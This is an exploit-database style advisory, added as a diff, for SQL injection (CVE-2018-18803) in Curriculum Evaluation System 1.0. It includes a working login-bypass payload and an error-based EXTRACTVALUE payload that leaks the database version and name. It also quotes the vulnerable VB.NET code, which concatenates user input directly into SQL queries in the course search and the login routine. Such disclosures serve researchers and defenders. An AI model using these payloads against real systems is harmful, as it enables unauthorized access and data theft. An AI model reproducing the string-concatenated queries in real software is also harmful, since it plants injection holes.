@@ -1,0 +1,119 @@
+# Exploit Title: Curriculum Evaluation System 1.0 - SQL Injection
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/users/janobe
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/curriculumevaluationsystem_0.zip
+# Version: 1.0
+# Category: Windows
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18803
+
+# POC: 
+# 1)
+# User: 'or 1=1 or ''='
+# ' AnD EXTRAcTVaLUE(22,CoNCaT(0x5c,veRSion(),(SElECT (ElT(1=1,1))),database()))-- Efe
+
+# POC: 
+# 2)
+# User: 'or 1=1 or ''='
+# Pass: Null
+# 
+# https://2.bp.blogspot.com/-4O0oZTFkzJE/W9Y4HWcImQI/AAAAAAAAEN4/5P-n-9H6JAQMiN6UpJu340xI4x_-MSjHACLcBGAs/s1600/sql5.png
+
+#[PATH]/frmCourse.vb
+#....
+#47     Private Sub txtSearch_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles txtSearch.TextChanged
+#48         sql = "Select * From tblcourse WHERE Course Like '%" & txtSearch.Text & "%'"
+#49         reloadDtg(sql, dtglist)
+#50     End Sub
+#....
+
+#[PATH]/includes/user.vb
+#....
+#05     Public Sub login(ByVal username As Object, ByVal pass As Object)
+#06         Try
+#07 
+#08             con.Open()
+#09             reloadtxt("SELECT * FROM `tbluseraccount` WHERE User_name= '" & username & "' and Pass = sha1('" & pass & "')")
+#10 
+#11 
+#12             If dt.Rows.Count > 0 Then
+#13                 If dt.Rows(0).Item("UserType") = "Administrator" Then
+#14                     MsgBox("Welcome " & dt.Rows(0).Item("UserType"))
+#15                     'Form1.Text = "User :" & dt.Rows(0).Item("Fullname")
+#16                     With Form1
+#17                         .tsAddG.Enabled = True
+#18                         .tsStudent.Enabled = True
+#19                         .tsCurriculum.Enabled = True
+#20                         .tsGrades.Enabled = True
+#21                         .tsReport.Enabled = True
+#22                         .tsUtilities.Enabled = True
+#23                         .tsSearchStudent.Enabled = True
+#24                         .tsLogin.Image = My.Resources.logout
+#25                         .tsLogin.Text = "Logout"
+#26                     End With
+#27 
+#28 
+#29                     LoginForm1.Close()
+#30 
+#31 
+#32                 ElseIf dt.Rows(0).Item("UserType") = "Faculty" Then
+#33 
+#34                     MsgBox("Welcome " & dt.Rows(0).Item("UserType"))
+#35                     'Form1.Text = "User :" & dt.Rows(0).Item("Fullname")
+#36                     With Form1
+#37                         .tsAddG.Enabled = True
+#38                         .tsStudent.Enabled = True
+#39                         .tsCurriculum.Enabled = True
+#40                         .tsGrades.Enabled = True
+#41                         .tsReport.Enabled = True
+#42                         .tsSearchStudent.Enabled = True
+#43                         .tsLogin.Image = My.Resources.logout
+#44                         .tsLogin.Text = "Logout"
+#45                     End With
+#46 
+#47 
+#48 
+#49 
+#50                     LoginForm1.Close()
+#51 
+#52 
+#53 
+#54                 ElseIf dt.Rows(0).Item("UserType") = "Assistant" Then
+#55                     MsgBox("Welcome " & dt.Rows(0).Item("UserType"))
+#56                     'With Form1
+#57                     With Form1
+#58                         .tsAddG.Enabled = True
+#59                         .tsStudent.Enabled = True
+#60                         .tsCurriculum.Enabled = True
+#61                         .tsGrades.Enabled = True
+#62                         .tsReport.Enabled = True
+#63 
+#64                         .tsSearchStudent.Enabled = True
+#65                         .tsLogin.Image = My.Resources.logout
+#66                         .tsLogin.Text = "Logout"
+#67                     End With
+#68 
+#69 
+#70                     LoginForm1.Close()
+#71                 End If
+#72 
+#73                 'Form1.UserIdToolStripStatus.Text = dt.Rows(0).Item("UserId")
+#74                 'Form1.UserToolStripStatus.Text = dt.Rows(0).Item("Fullname")
+#75                 'Form1.StatusStrip1.Visible = True
+#76                 'inserting logs
+#77                 'sql = "INSERT INTO `tbllogs` (`UserId`, `LogDate`,LogMode) " & _
+#78                 '   " VALUES ('" & dt.Rows(0).Item("UserId") & "',Now(),'Logged in')"
+#79                 'create(sql)
+#80 
+#81             Else
+#82                 MsgBox("Acount doest not exist!", MsgBoxStyle.Information)
+#83             End If
+#84         Catch ex As Exception
+#85             MsgBox(ex.Message)
+#86         End Try
+#87         con.Close()
+#88         da.Dispose()
+#89     End Sub
+#....
